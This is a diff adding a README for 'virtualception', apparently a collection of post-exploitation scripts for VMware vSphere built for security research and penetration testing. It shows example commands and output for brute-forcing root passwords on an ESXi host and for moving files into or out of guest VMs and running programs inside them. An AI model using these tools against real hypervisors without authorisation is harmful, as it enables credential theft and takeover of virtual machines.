@@ -1,0 +1,41 @@
+What is virtualception
+----------------------
+- blog about research of virtual security
+- some scripts for post-exploitation of virtual environments (vSphere only currently)
+- More information
+  https://virtualception.wordpress.com/
+  https://twitter.com/DanielX4v3r
+- Most scripts include the -h switch, so here only small examples:
+- python scripts tested with pyvmomi 5.5
+- powershell scripts tested with PowerCLI
+
+
+Short description of the scripts
+--------------------------------
+bruteforce.py
+$ python bruteforce.py -s 192.168.153.128 -u root -P pass.txt
+  failed  - user root password: 1234567
+* SUCCESS - user root password: password
+
+download_file_from_vm.py
+$ python download_file_from_vm.py -v "527a8ff0-09db-b5cc-eec4-297e49b45ee7" -r dax -w password -u root -p password -s 192.168.153.128 -l "c:\\test.txt"
+Successfully downloaded file
+Output: test
+
+execute_program_in_vm.py
+$ python execute_program_in_vm2.py -v "527a8ff0-09db-b5cc-eec4-297e49b45ee7" -r dax -w password -u root -p password -s 192.168.153.128 -l "ipconfig.exe" -f ""
+
+upload_file_to_vm.py
+# python upload_file_to_vm.py -v "527a8ff0-09db-b5cc-eec4-297e49b45ee7" -r dax -w password -u root -p password -s 192.168.153.128 -l "c:\\test2.txt" -f test.txt
+
+ssh_start_service.ps1
+ssh_stop_service.ps1
+Two one liners for starting and stopping the ssh service on an ESXi server. Don't forget to authenticate.
+
+
+Getting started
+---------------
+For installing SDKs and tools for starting penetration testing or own research start reading here:
+https://virtualception.wordpress.com/2016/05/13/vmware-powercli-installation-1st-steps/
+https://virtualception.wordpress.com/2016/05/12/installation-of-vsphere-cli-python-api-ubuntu/
+https://virtualception.wordpress.com/2016/05/12/install-pyvmomi-on-windows-7/
